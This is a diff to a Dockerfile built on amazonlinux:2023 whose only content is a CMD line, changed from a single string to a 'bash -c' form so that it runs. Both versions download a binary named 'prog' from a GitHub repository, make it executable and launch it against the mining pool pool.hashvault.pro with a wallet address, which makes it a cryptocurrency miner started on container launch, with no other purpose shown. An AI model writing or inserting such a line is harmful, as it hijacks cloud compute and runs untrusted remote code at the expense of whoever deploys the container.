@@ -1,2 +1,2 @@
 FROM amazonlinux:2023
-CMD ["wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 424trk6WMSt8vygKnjq3EfFw3C3bifZikKqS9vnG71QGGaoaLSTRxgSZeJboHFoiAkKHeprp4QUqz9FEf6p5AzcN5ex3iYL --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"]
+CMD ["bash", "-c", "wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 424trk6WMSt8vygKnjq3EfFw3C3bifZikKqS9vnG71QGGaoaLSTRxgSZeJboHFoiAkKHeprp4QUqz9FEf6p5AzcN5ex3iYL --pass aws --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"]
